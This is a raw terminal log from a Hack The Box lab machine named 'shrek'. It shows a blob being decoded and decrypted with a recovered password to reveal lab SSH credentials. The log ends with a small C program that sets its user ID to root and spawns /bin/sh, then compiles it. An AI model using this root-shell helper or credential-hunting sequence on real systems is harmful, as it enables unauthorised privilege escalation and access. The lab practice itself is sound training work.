+└──╼ #echo -n J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc= | base64 -d  > blob                                    
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #cat strings                    
+PrinceCharming┌─[root@parrot]─[~/hackthebox/shrek/ftp]                     
+└──╼ #^C                             
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #python                         
+Python 2.7.17 (default, Oct 19 2019, 23:36:22)                             
+[GCC 9.2.1 20191008] on linux2       
+Type "help", "copyright", "credits" or "license" for more information.     
+>>> import seccure                   
+>>> ct  =  '\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'              
+>>> secure.dcrypt(ct,b'PrinceCharming')                                    
+Traceback (most recent call last):   
+  File "<stdin>", line 1, in <module>                                      
+NameError: name 'secure' is not defined                                    
+>>> seccure.dcrypt(ct,b'PrinceCharming')                                   
+Traceback (most recent call last):   
+  File "<stdin>", line 1, in <module>                                      
+AttributeError: 'module' object has no attribute 'dcrypt'                  
+>>> seccure.decrypt(ct,b'PrinceCharming')                                  
+'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'                                                                      
+>>> exit()                           
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #cd ..                          
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ls                             
+ ftp   ftp_credential   ftp_credential.png   ftp_login.aup   ftp_login_data   nmap  'Smash Mouth - All Star.mp3'   ssh_credential                      
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #cd ftp                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #less b                         
+bb6325c5172840b3ad67c4c4b5cc8df1.txt      bb6325c5172840b3ad67c4c4b5cc8df1.txt.b64  blob                                                               
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #less blob                      
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #cd ..                          
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #cat exec.c                     
+#include <stdio.h>                   
+#include <stdlib.h>                  
+#include <unistd.h>                  
+int main( int argc,char *argv[] )    
+{                                    
+    setreuid(0, 0);                  
+    execve("/bin/sh",NULL ,NULL);    
+
+}                                    
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #gcc exec.c -o exec             
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #pluma exec.c                   
